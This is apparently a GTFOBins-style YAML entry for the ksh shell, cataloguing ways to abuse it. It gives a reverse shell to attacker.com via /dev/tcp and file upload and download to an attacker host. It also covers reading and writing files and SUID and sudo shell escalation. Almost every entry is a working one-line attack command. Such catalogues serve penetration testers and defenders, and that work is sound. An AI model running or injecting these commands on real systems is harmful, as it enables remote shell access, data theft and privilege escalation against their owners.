---
functions:
  shell:
    - code: ksh
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'
  file-upload:
    - description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        ksh -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
    - description: Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_get
        ksh -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
            3<>/dev/tcp/$RHOST/$RPORT \
            | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
    - description: Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_get
        ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
  file-write:
    - code: |
        export LFILE=file_to_write
        ksh -c 'echo DATA > $LFILE'
  file-read:
    - description: It trims trailing newlines.
      code: |
        export LFILE=file_to_read
        ksh -c 'echo "$(<$LFILE)"'
    - description: It trims trailing newlines.
      code: |
        export LFILE=file_to_read
        ksh -c $'read -r -d \x04 < "$LFILE"; echo "$REPLY"'
  suid:
    - code: ./ksh -p
  sudo:
    - code: sudo ksh
---
